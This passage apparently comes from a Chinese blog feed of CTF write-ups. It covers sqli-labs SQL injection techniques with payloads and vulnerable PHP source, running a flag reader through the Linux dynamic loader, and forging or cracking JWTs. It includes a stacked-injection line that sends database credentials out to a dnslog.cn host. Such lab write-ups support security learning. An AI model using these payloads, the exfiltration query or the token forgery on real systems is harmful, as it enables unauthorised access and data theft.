looser&quot;;        print_r(mysql_error());        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;            echo &quot;&lt;/font&gt;&quot;;      }}?&gt;</code></pre><h3 id="post传参"><a href="#post传参" class="headerlink" title="==post传参=="></a>==post传参==</h3><p>post传参有很多方式最本质的就是在输入框传<br>然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用<br>较多的是一些抓包软件，burpsuit等<br>他们既有抓包功能，也有重发器，测试器功能强大</p><h3 id="注入语句"><a href="#注入语句" class="headerlink" title="==注入语句=="></a>==注入语句==</h3><p>和get传参类型的语句大体相同，不同的地方有原来的id=1’由于get传参，抓包后自动写入uname/password=所以只需要写后面的admin’ 加上sql执行语句，原理一样，都是让系统执行完传参后继续把sql语句执行来回显  这里末尾注释符可用# </p><h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><p>post传参同样有三大类</p><h3 id="正误回显都有"><a href="#正误回显都有" class="headerlink" title="正误回显都有"></a>正误回显都有</h3><p>在burpsuit重发器里传参，<br><img src="https://img-blog.csdnimg.cn/4a405e6fb6bb451bb59e0111a93ebca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>红字部分即为注入语句，这里同样只展示最后一步 其他可按照get传参原理<br>只需改动小部分</p><h3 id="没正确回显-有报错回显"><a href="#没正确回显-有报错回显" class="headerlink" title="没正确回显 有报错回显"></a>没正确回显 有报错回显</h3><p><img src="https://img-blog.csdnimg.cn/facab42bd569421da49da39cac92470a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">这里我采用了辨识度更高的时间盲注 布尔盲注同样使用</p><h3 id="正错回显都没有"><a href="#正错回显都没有" class="headerlink" title="正错回显都没有"></a>正错回显都没有</h3><p>同上面直接时间盲注</p><h1 id="基于报错注入的各种传参方式"><a href="#基于报错注入的各种传参方式" class="headerlink" title="基于报错注入的各种传参方式"></a>基于报错注入的各种传参方式</h1><h2 id="先讲报错注入"><a href="#先讲报错注入" class="headerlink" title="==先讲报错注入=="></a>==先讲报错注入==</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml (XML_document, XPath_string, new_value)<br>替换查找到的符合条件的数据</p><h3 id="extactvalue"><a href="#extactvalue" class="headerlink" title="extactvalue"></a>extactvalue</h3><p>extractvalue(XML_document, XPath_string)<br>对XML文档进行查询的函数<br>当上述两个函数的xpath路径出错时，将XML_document报错返回回来<br>注意只能返回32个字符，后面的可用limit 等来限制返回的字符位置</p><h2 id="传参方式"><a href="#传参方式" class="headerlink" title="==传参方式=="></a>==传参方式==</h2><p>burp suite抓包后改相应数据</p><h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><pre><code class="sql">User-Agent:&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#39;</code></pre><h3 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h3><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><h3 id="base64加密的cookie注入"><a href="#base64加密的cookie注入" class="headerlink" title="base64加密的cookie注入"></a>base64加密的cookie注入</h3><p>将payload经base64加密后上传即可</p><h1 id="过滤注释的GET"><a href="#过滤注释的GET" class="headerlink" title="==过滤注释的GET=="></a>==过滤注释的GET==</h1><p>源码中过滤掉了注释符<br>注释符不能用了所以要在闭合上下功夫</p><pre><code class="php">?id=&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; = &#39;1?id=-1&#39; union select 1,(select group_concat(username) from users),&#39;3</code></pre><p>在末尾构造语句使闭合符号与语句组成一个不影响的语句<br>闭合方式多种多样</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="==二次注入=="></a>==二次注入==</h1><p>首先注册一个用户admin‘#<br>然后登录<br>修改密码<br>当你修改密码时 后台就执行了</p><pre><code class="sql">UPDATE users SET passwd=&quot;新密码&quot; WHERE username =&#39; admin&#39; # &#39; AND password=&#39;</code></pre><p>也就是<br>你用admin’#用户把admin用户的密码给改了</p><h1 id="过滤"><a href="#过滤" class="headerlink" title="==过滤=="></a>==过滤==</h1><h2 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h2><p>将payload里所有 and 和or<br>替换为 anandd 和 oorr<br>这里password也要变成passwoorrd</p><pre><code class="php">?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users#</code></pre><h2 id="过滤下的报错注入"><a href="#过滤下的报错注入" class="headerlink" title="过滤下的报错注入"></a>过滤下的报错注入</h2><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code class="php">$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            /strip out OR (non case sensitive)    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        /Strip out AND (non case sensitive)    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        /strip out */    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        /Strip out --    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            /Strip out #    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        /Strip out spaces    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        /Strip out slashes    return $id;</code></pre><p>要用到||代替or information里的or要双写，用||‘1’=‘1来闭合</p><pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1</code></pre><p><img src="https://img-blog.csdnimg.cn/41bb72de0481416fa30c710fad9b1959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><p><img src="https://img-blog.csdnimg.cn/73dc47cc35d046f39f35db64fba9fca9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1</code></pre><p>大小写select和union</p><h2 id="过滤下的时间盲注"><a href="#过滤下的时间盲注" class="headerlink" title="过滤下的时间盲注"></a>过滤下的时间盲注</h2><p>26到27关的a都是无法报错注入的<br>能用时间盲注过滤方法和不带a的关一样</p><h1 id="waf"><a href="#waf" class="headerlink" title="==waf=="></a>==waf==</h1><pre><code class="php">/ take the variables if(isset($_GET[&#39;id&#39;])){    $qs = $_SERVER[&#39;QUERY_STRING&#39;];    $hint=$qs;    $id1=java_implimentation($qs);    $id=$_GET[&#39;id&#39;];    //echo $id1;    whitelist($id1);}/WAF implimentation with a whitelist approach..... only allows input to be Numeric.function whitelist($input){    $match = preg_match(&quot;/^\d+$/&quot;, $input);    if($match)        {//echo &quot;you are good&quot;;            //return $match;            }    else        {header(&#39;Location: hacked.php&#39;);            //echo &quot;you are bad&quot;;            }}/ The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).function java_implimentation($query_string){    $q_s = $query_string;    $qs_array= explode(&quot;&amp;&quot;,$q_s);    foreach($qs_array as $key =&gt; $value){        $val=substr($value,0,2);        if($val==&quot;id&quot;){            $id_value=substr($value,3,30);             return $id_value;            echo &quot;&lt;br&gt;&quot;;            break;}        }}</code></pre><p>java_implimentation模拟 tomcat 的查询函数处理<br>whitelist白名单过滤 检测到不符合规则就重定向<br>漏洞是whitelist只检测了java_implimentation输出的第一个参数$id_value<br>后面的逃过检测 注入点在后面<br><img src="https://img-blog.csdnimg.cn/cb26a817890f43dea574e56898b28098.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="==宽字节注入=="></a>==宽字节注入==</h1><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。<br>urlencode(’) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。<br><img src="https://img-blog.csdnimg.cn/b1928e9bf27a4e4aaae0531adb797366.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h2 id="结束注释"><a href="#结束注释" class="headerlink" title="==结束注释=="></a>==结束注释==</h2><p>当转译为‘/时可用’/**/来==结束注释==</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="==堆叠注入=="></a>==堆叠注入==</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句<br>堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。<br>如下展示了堆叠注入插入了一个用户数据</p><p><img src="https://img-blog.csdnimg.cn/382b3c83943547868cbe1452eb266b25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/ba1f6818754e470bb14c6e4bbacded8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">同时也可以进行dnslog注入</p><pre><code class="php">?id=1&#39;;select load_file(concat(&#39;//&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.au0mvd.dnslog.cn/1.txt&#39;));--+</code></pre><p><img src="https://img-blog.csdnimg.cn/9b01f339db4641799cd67780c58d458e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><pre><code class="css">desc查看表结构的详细信息desc table_name;此处desc是describe的缩写，用法: desc 表名/查询语句</code></pre><p>handler适用于select等过滤</p><pre><code class="sql">handler handler_table open;handler handler_table read first;handler handler_table read next;……handler handler_table close;</code></pre><h1 id="二次注入进阶"><a href="#二次注入进阶" class="headerlink" title="二次注入进阶"></a>二次注入进阶</h1><h2 id="需成功登录才能二次注入"><a href="#需成功登录才能二次注入" class="headerlink" title="需成功登录才能二次注入"></a>需成功登录才能二次注入</h2><pre><code class="php">function sqllogin($host,$dbuser,$dbpass, $dbname){   // connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);   $password = $_POST[&quot;login_password&quot;];   // Check connection   if (mysqli_connect_errno($con1))   {       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();   }   else   {       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);   } /* execute multi query */     $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;   if (@mysqli_multi_query($con1, $sql))   {        /* store first result set */      if($result = @mysqli_store_result($con1))      {     if($row = @mysqli_fetch_row($result)){        if ($row[1]) {           return $row[1];        }        else{           return 0;        }     }      }      else  {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;        }   }   else    {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;      }</code></pre><p>这里对username和password过滤不强<br>可通过万能密码</p><pre><code class="php"> 1’ or &#39;1&#39;=&#39;1</code></pre><p> 登录<br> 接下来通过修改密码界面二次注入</p><pre><code class="php"> &lt;?PHPsession_start();if (!isset($_COOKIE[&quot;Auth&quot;])){    if (!isset($_SESSION[&quot;username&quot;])) {           header(&#39;Location: index.php&#39;);    }    header(&#39;Location: index.php&#39;);}?&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);if (isset($_POST[&#39;submit&#39;])){    # Validating the user input........    $username= $_SESSION[&quot;username&quot;];    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);//原密码 还是万能密码绕过    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);//新密码    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);    if($pass==$re_pass){            $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);        $row = mysql_affected_rows();        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;        echo &#39;&lt;center&gt;&#39;;        if($row==1){            //echo &quot;Password successfully updated&quot;;            echo &#39;&lt;img src=&quot;../images/password-updated.jpg&quot;&gt;&#39;;            }        else{            header(&#39;Location: failed.php&#39;);            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;        }    }    else{        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;        header(&#39;refresh:2, url=index.php&#39;);    }}?&gt;&lt;?phpif(isset($_POST[&#39;submit1&#39;])){    session_destroy();    setcookie(&#39;Auth&#39;, 1 , time()-3600);    header (&#39;Location: index.php&#39;);}?&gt;</code></pre><p>他用户名通过session获取，所以无法更改其他用户</p><h1 id="order-by注入"><a href="#order-by注入" class="headerlink" title="==order by注入=="></a>==order by注入==</h1><pre><code class="sql">SELECT * FROM users ORDER BY </code></pre><p>order by 与where差不多<br>但不同是order by不能使用union联合<br>其他都可 也比较灵活<br>从46到53关皆为order by注入</p><h1 id="限制次数的注入"><a href="#限制次数的注入" class="headerlink" title="限制次数的注入"></a>限制次数的注入</h1><p>从54关开始，限制了注入次数<br>一旦超过次数就会改变数据<br>一切又要重新开始<br><img src="https://img-blog.csdnimg.cn/f9b1e0f39b0347c28528953eed71b19b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3d5876f7879045899ce8af31d082f9b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/17eb5837dcf14d76bcd6f276ebccd83c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/1eda68e6677d43eca8c14b97cffbc769.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">58-62可以报错注入<br>从62关开始只能使用盲注<br>==id注入部分代码==</p><pre><code class="php">&lt;?phpid注入部分代码//including the Mysql connect parameters.include &#39;../sql-connections/sql-connect-1.php&#39;;include &#39;../sql-connections/functions.php&#39;;error_reporting(0);$pag = $_SERVER[&#39;PHP_SELF&#39;]; /generating page address to piggy back after redirects...$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; /characterset for generating random data$times= 10;$table = table_name();$col = column_name(1);     / session id column name$col1 = column_name(2);   /secret key column name/ Submitting the final answerif(!isset($_POST[&#39;answer_key&#39;])){    / resetting the challenge and repopulating the table .    if(isset($_POST[&#39;reset&#39;])){        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;        echo &quot;Redirecting you to main challenge page..........\n&quot;;        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        //echo &quot;cookie expired&quot;;    }    else{        / Checking the cookie on the page and populate the table with random value.        if(isset($_COOKIE[&#39;challenge&#39;])){            $sessid=$_COOKIE[&#39;challenge&#39;];            //echo &quot;Cookie value: &quot;.$sessid;        }        else{            $expire = time()+60*60*24*30;            $hash = data($table,$col);            setcookie(&quot;challenge&quot;, $hash, $expire);        }        echo &quot;&lt;br&gt;\n&quot;;        /take the variables        if(isset($_GET[&#39;id&#39;])){            $id=$_GET[&#39;id&#39;];            /logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);            fclose($fp);            /update the counter in database            next_tryy();            /Display attempts on screen.            $tryyy = view_attempts();            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;          /Reset the Database if you exceed allowed attempts.            if($tryyy &gt;= ($times+1)){                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;                echo &quot;Redirecting you to challenge page..........\n&quot;;                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );                echo &quot;&lt;br&gt;\n&quot;;            }            / Querry DB to get the correct output            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;            $result=mysql_query($sql);            $row = mysql_fetch_array($result);            if($row){                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;                    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                echo &quot;&lt;/font&gt;&quot;;            }            else {                echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//                print_r(mysql_error());                echo &quot;&lt;/font&gt;&quot;;              }        }        else{            echo &quot;Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;&quot;;            echo &quot;&lt;font color=&#39;#00FFFF&#39;: size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;(&#39;CHALLENGES&#39;)&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;&quot;;            echo &quot;For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;&quot; ;        }    }}</code></pre><p>==答案提交部分==</p><pre><code class="php">else{    echo &#39;&lt;div  style=&quot; color:#00FFFF; font-size:18px; text-align:center&quot;&gt;&#39;;    $key = addslashes($_POST[&#39;key&#39;]);    $key = mysql_real_escape_string($key);    //echo $key;    /Query table to verify your result    $sql=&quot;SELECT 1 FROM $table WHERE $col1= &#39;$key&#39;&quot;;    //echo &quot;$sql&quot;;    $result=mysql_query($sql)or die(&quot;error in submittion of Key Solution&quot;.mysql_error());    $row = mysql_fetch_array($result);    if($row)    {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-54-1.jpg&quot; /&gt;&#39;;        echo &quot;&lt;/font&gt;&quot;;         header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );        }    else {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        echo &quot;\n&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;        header( &quot;refresh:3;url=index.php&quot; );        //print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;          }    }?&gt;</code></pre><p>@<a href="目录">TOC</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sql注入就是&lt;br&gt;当用户输入一些本不是用户名密码的sql语句&lt;br&gt;这些语句没有被过滤&lt;br&gt;执行后通过回显等方式，使注入者获得了数据库的信息&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;  水了几天用来搞visual studio2022和Windows11所以本文略微简
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="sql" scheme="/tags/sql/"/>
    
      <category term="sqli-lab" scheme="/tags/sqli-lab/"/>
    
  </entry>
  
  <entry>
    <title>linux动态加载</title>
    <link href="/2022/08/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    <id>/2022/08/linux动态加载/</id>
    <published>2022-08-29T10:18:54.829Z</published>
    <updated>2022-08-31T03:11:48.441Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p><blockquote><p>都到这一题了权限应该不用讲了</p></blockquote><p>提示给了shell<br>且不需要提权<br><img src="https://img-blog.csdnimg.cn/a694c0aa89c24d1ba00256e97cefd34b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p><h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p><blockquote><p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p><p><img src="https://img-blog.csdnimg.cn/14c42167ec0745548b280beb335e12b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p></blockquote><h2 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器/加载器"></a>动态库链接器/加载器</h2><ul><li>当需要动态链接的应用被操作系统加载时</li><li>系统必须要定位然后加载它所需要的所有动态库文件</li><li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li><li>执行操作时操作系统会将控制权交给 ld-linux.so</li><li>而不是交给程序正常的进入地址</li><li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li></ul><h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src="https://img-blog.csdnimg.cn/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/67a17bc7a0144be2a741e537f7ab2380.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面/lib64/ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src="https://img-blog.csdnimg.cn/e49dc243bc714d2e95cb5223b895599e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是他的介绍<br>执行</p><pre><code>/lib64/ld-linux-x86-64.so.2 /readflag</code></pre><p>get</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux动态加载&quot;&gt;&lt;a href=&quot;#linux动态加载&quot; class=&quot;headerlink&quot; title=&quot;linux动态加载&quot;&gt;&lt;/a&gt;linux动态加载&lt;/h2&gt;&lt;h1 id=&quot;查看环境&quot;&gt;&lt;a href=&quot;#查看环境&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="ctf" scheme="/categories/ctf/"/>
    
    
      <category term="web" scheme="/tags/web/"/>
    
      <category term="ctfhub" scheme="/tags/ctfhub/"/>
    
      <category term="linux" scheme="/tags/linux/"/>
    
      <category term="动态加载" scheme="/tags/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>ctfhub-jwt</title>
    <link href="/2022/08/jwt/"/>
    <id>/2022/08/jwt/</id>
    <published>2022-08-29T10:18:54.827Z</published>
    <updated>2022-08-31T03:11:43.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob" target="_blank" rel="noopener">jwt基础知识</a></p><p>flag在下面</p><p>需要了解一下jwt组成部分</p><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>随便输个</p><p>进去查消息头</p><p>然后在</p><p><a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a></p><p>decode    一共两部分ag是另一半<br><img src="https://img-blog.csdnimg.cn/a4b0f89e87f84f8aa21b3071ec99c066.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><h1 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h1><pre><code class="python">import jwtalgorithm=&quot;none&quot;payload = {  &quot;username&quot;: &quot;admin&quot;,  &quot;password&quot;: &quot;admin&quot;,  &quot;role&quot;:&quot;admin&quot;  }key = &quot;&quot;encoded = jwt.encode(payload,key,algorithm)print(encoded)</code></pre><p>jwt的签名可以为无</p><blockquote><p>今天写这个脚本的时候命名为jwt.py</p><p>结果报错 但是系统环境运行正常</p><p>才知道是文件名的事</p><p>import jwt 他先自己引用自己了</p></blockquote><p>抓包</p><p>把cookie里的token改为这脚本的运行结果</p><h1 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h1><p>需要用到<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></p><p>依次执行即可</p><pre><code class="shell">git clone https://github.com/brendan-rius/c-jwt-cracker./c-jwt-crackermake./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.w4i8KWRWmY_xTYtRnFZnp5vLIxPG2abCly6lW6QxTKs</code></pre><p>然后得出该jwt密钥</p><p>然后放之前那个网站</p><p>改role为admin</p><p><img src="https://img-blog.csdnimg.cn/7fbb4534fca24281881a5aea1cba74ab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p><p><img src="https://img-blog.csdnimg.cn/0c56be41283b43b7ae7bb6c95aac0ae6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述">返回提交token<br><img 